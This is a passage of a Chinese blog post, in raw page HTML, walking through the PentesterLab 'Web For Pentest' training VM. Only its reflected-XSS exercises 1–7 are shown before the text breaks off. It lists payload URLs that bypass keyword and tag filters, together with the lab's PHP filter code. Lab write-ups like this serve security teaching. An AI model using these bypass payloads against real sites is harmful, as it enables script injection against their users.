+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Pre">1&nbsp;&nbsp;<b>Pre</b></a><hr class="navbar-divider"> <a class="navbar-item" href="#Hacking">2&nbsp;&nbsp;<b>Hacking</b></a> <a class="navbar-item" href="#XSS">2.1&nbsp;&nbsp;XSS</a> <a class="navbar-item" href="#Example-1">2.1.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2">2.1.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#Example-3">2.1.3&nbsp;&nbsp;Example 3</a> <a class="navbar-item" href="#Example-4">2.1.4&nbsp;&nbsp;Example 4</a> <a class="navbar-item" href="#Example-5">2.1.5&nbsp;&nbsp;Example 5</a> <a class="navbar-item" href="#Example-6">2.1.6&nbsp;&nbsp;Example 6</a> <a class="navbar-item" href="#Example-7">2.1.7&nbsp;&nbsp;Example 7</a> <a class="navbar-item" href="#Example-8">2.1.8&nbsp;&nbsp;Example 8</a> <a class="navbar-item" href="#Example-9">2.1.9&nbsp;&nbsp;Example 9</a> <a class="navbar-item" href="#File-Include">2.2&nbsp;&nbsp;File Include</a> <a class="navbar-item" href="#Example-1-1">2.2.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-1">2.2.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#LDAP-attacks">2.3&nbsp;&nbsp;LDAP attacks</a> <a class="navbar-item" href="#Example-1-2">2.3.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-2">2.3.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#SQL-Injection">2.4&nbsp;&nbsp;SQL Injection</a> <a class="navbar-item" href="#Example-1-3">2.4.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-3">2.4.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#Example-3-1">2.4.3&nbsp;&nbsp;Example 3</a> <a class="navbar-item" href="#Example-4-1">2.4.4&nbsp;&nbsp;Example 4</a> <a class="navbar-item" href="#Example-5-1">2.4.5&nbsp;&nbsp;Example 5</a> <a class="navbar-item" href="#Example-6-1">2.4.6&nbsp;&nbsp;Example 6</a> <a class="navbar-item" href="#Example-7-1">2.4.7&nbsp;&nbsp;Example 7</a> <a class="navbar-item" href="#Example-8-1">2.4.8&nbsp;&nbsp;Example 8</a> <a class="navbar-item" href="#Example-9-1">2.4.9&nbsp;&nbsp;Example 9</a> <a class="navbar-item" href="#Code-injection">2.5&nbsp;&nbsp;Code injection</a> <a class="navbar-item" href="#Example-1-4">2.5.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-4">2.5.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#Example-3-2">2.5.3&nbsp;&nbsp;Example 3</a> <a class="navbar-item" href="#File-Upload">2.6&nbsp;&nbsp;File Upload</a> <a class="navbar-item" href="#Example-1-5">2.6.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-5">2.6.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#Directory-traversal">2.7&nbsp;&nbsp;Directory traversal</a> <a class="navbar-item" href="#Example-1-6">2.7.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-6">2.7.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#Example-3-3">2.7.3&nbsp;&nbsp;Example 3</a> <a class="navbar-item" href="#Commands-injection">2.8&nbsp;&nbsp;Commands injection</a> <a class="navbar-item" href="#Example-1-7">2.8.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-7">2.8.2&nbsp;&nbsp;Example 2</a> <a class="navbar-item" href="#Example-3-4">2.8.3&nbsp;&nbsp;Example 3</a> <a class="navbar-item" href="#XML-attacks">2.9&nbsp;&nbsp;XML attacks</a> <a class="navbar-item" href="#Example-1-8">2.9.1&nbsp;&nbsp;Example 1</a> <a class="navbar-item" href="#Example-2-8">2.9.2&nbsp;&nbsp;Example 2</a><hr class="navbar-divider"> <a class="navbar-item" href="#Conclusion">3&nbsp;&nbsp;<b>Conclusion</b></a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> Web For Pentest</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Mar 8 2019</span> <span class="second-date-block">(<time datetime="2019-03-08T23:31:42.000Z" itemprop="datePublished">Mar 8 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/Sec/">Sec</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">21 minutes read (About 3176 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Pre"><span class="post-toc-number">1.</span> <span class="post-toc-text">Pre</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Hacking"><span class="post-toc-number">2.</span> <span class="post-toc-text">Hacking</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XSS"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">XSS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">Example 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-3"><span class="post-toc-number">2.1.3.</span> <span class="post-toc-text">Example 3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-4"><span class="post-toc-number">2.1.4.</span> <span class="post-toc-text">Example 4</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-5"><span class="post-toc-number">2.1.5.</span> <span class="post-toc-text">Example 5</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-6"><span class="post-toc-number">2.1.6.</span> <span class="post-toc-text">Example 6</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-7"><span class="post-toc-number">2.1.7.</span> <span class="post-toc-text">Example 7</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-8"><span class="post-toc-number">2.1.8.</span> <span class="post-toc-text">Example 8</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-9"><span class="post-toc-number">2.1.9.</span> <span class="post-toc-text">Example 9</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#File-Include"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">File Include</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-1"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-1"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">Example 2</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LDAP-attacks"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">LDAP attacks</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-2"><span class="post-toc-number">2.3.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-2"><span class="post-toc-number">2.3.2.</span> <span class="post-toc-text">Example 2</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQL-Injection"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">SQL Injection</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-3"><span class="post-toc-number">2.4.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-3"><span class="post-toc-number">2.4.2.</span> <span class="post-toc-text">Example 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-3-1"><span class="post-toc-number">2.4.3.</span> <span class="post-toc-text">Example 3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-4-1"><span class="post-toc-number">2.4.4.</span> <span class="post-toc-text">Example 4</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-5-1"><span class="post-toc-number">2.4.5.</span> <span class="post-toc-text">Example 5</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-6-1"><span class="post-toc-number">2.4.6.</span> <span class="post-toc-text">Example 6</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-7-1"><span class="post-toc-number">2.4.7.</span> <span class="post-toc-text">Example 7</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-8-1"><span class="post-toc-number">2.4.8.</span> <span class="post-toc-text">Example 8</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-9-1"><span class="post-toc-number">2.4.9.</span> <span class="post-toc-text">Example 9</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Code-injection"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">Code injection</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-4"><span class="post-toc-number">2.5.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-4"><span class="post-toc-number">2.5.2.</span> <span class="post-toc-text">Example 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-3-2"><span class="post-toc-number">2.5.3.</span> <span class="post-toc-text">Example 3</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#File-Upload"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">File Upload</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-5"><span class="post-toc-number">2.6.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-5"><span class="post-toc-number">2.6.2.</span> <span class="post-toc-text">Example 2</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Directory-traversal"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">Directory traversal</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-6"><span class="post-toc-number">2.7.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-6"><span class="post-toc-number">2.7.2.</span> <span class="post-toc-text">Example 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-3-3"><span class="post-toc-number">2.7.3.</span> <span class="post-toc-text">Example 3</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Commands-injection"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">Commands injection</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-7"><span class="post-toc-number">2.8.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-7"><span class="post-toc-number">2.8.2.</span> <span class="post-toc-text">Example 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-3-4"><span class="post-toc-number">2.8.3.</span> <span class="post-toc-text">Example 3</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XML-attacks"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">XML attacks</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-1-8"><span class="post-toc-number">2.9.1.</span> <span class="post-toc-text">Example 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Example-2-8"><span class="post-toc-number">2.9.2.</span> <span class="post-toc-text">Example 2</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Conclusion"><span class="post-toc-number">3.</span> <span class="post-toc-text">Conclusion</span></a></li></ol><html><head></head><body><p>很久之前就想做的靶机，一直没做，最近有空清理一下。地址在<a href="https://pentesterlab.com/exercises?dir=desc&amp;only=free&amp;sort=published_at" target="_blank" rel="noopener">PentestLab</a></p><a id="more"></a><p>[TOC]</p><h2 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h2><p>下载得到一个 iso 后直接用 vmware 装起来，<code>ifconfig</code>得到 ip ，访问就可以看到主页了</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000990.jpg" alt=""></p><h2 id="Hacking"><a href="#Hacking" class="headerlink" title="Hacking"></a>Hacking</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example1.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>一个典型的反射型 xss ，我们可以看到 url 中有个<code>name</code>的参数，直接 x</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.71.152/xss/example1.php?name=%3Cscript%3Ealert(1);%3C/script%3E</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example1.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>还是尝试用<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>直接 x ，发现被过滤了</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hello </span><br><span class="line">alert(1)      <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> PentesterLab 2013<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <span class="hljs-comment">&lt;!-- /container --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>大小写绕过</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span>/xss/example2.php<span class="hljs-built_in">?name</span>=<span class="hljs-meta">%3CScript</span><span class="hljs-meta">%3Ealert</span>(<span class="hljs-number">1</span>)<span class="hljs-meta">%3C</span>/Script<span class="hljs-meta">%3E</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example3.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>大小写也被过滤了，双写的话竟然没有被替代<code>&lt;scscriptript&gt;</code>，直接原样返回了，换成其他标签</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span>/xss/example3.php<span class="hljs-built_in">?name</span>=<span class="hljs-meta">%3Cbody</span>/onload=alert(<span class="hljs-number">1</span>)<span class="hljs-meta">%3E</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>查看了源代码，原来是把<code>&lt;script&gt;</code>与<code>&lt;/script&gt;</code>都替换了，把尖括号也替代了…也是自己不够仔细…确实应该想到替换包含了尖括号的问题</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span>/xss/example3.php<span class="hljs-built_in">?name</span>=<span class="hljs-meta">%3CSc</span><span class="hljs-meta">%3CScript</span><span class="hljs-meta">%3Eript</span><span class="hljs-meta">%3Ealert</span>(<span class="hljs-number">1</span>)<span class="hljs-meta">%3C</span>/Sc<span class="hljs-meta">%3C</span>/Script<span class="hljs-meta">%3Eript</span><span class="hljs-meta">%3E</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.71.152/xss/example4.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现直接回显了<code>error</code>，并没有其他的提示了，我们仍旧可以使用<code>&lt;body/onload=alert(1)&gt;</code></p><p>源代码是</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/script/i'</span>,$_GET[<span class="hljs-string">'name'</span>])){</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'error'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>禁止使用了<code>script</code>关键字</p><h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example5.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>fuzz 发现是<code>alert</code>直接就返回<code>error</code>了，不用<code>alert</code>，我们还有<code>prompt</code></p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span>/xss/example5.php<span class="hljs-built_in">?name</span>=<span class="hljs-meta">%3Cbody</span>/onload=prompt(<span class="hljs-number">1</span>)<span class="hljs-meta">%3E</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>源代码是：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/alert/i'</span>,$_GET[<span class="hljs-string">'name'</span>])){</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'error'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这…感觉有点无语，讲道理我还以为应该是<code>script</code>与<code>alert</code>一起过滤了…</p><h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example6.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试，发现输入变成了</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">	var $a= "<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>";</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>意思就是把输入给放在了<code>var $a= "…"</code>当中，闭合双引号，注释后面即可</p><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example6.php?name=%<span class="hljs-number">22</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-regexp">//</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example7.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试，发现输入变成了</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">	var $a= '<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>';</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>依然可以闭合单引号，注释后面即可。</p><p></p><figure 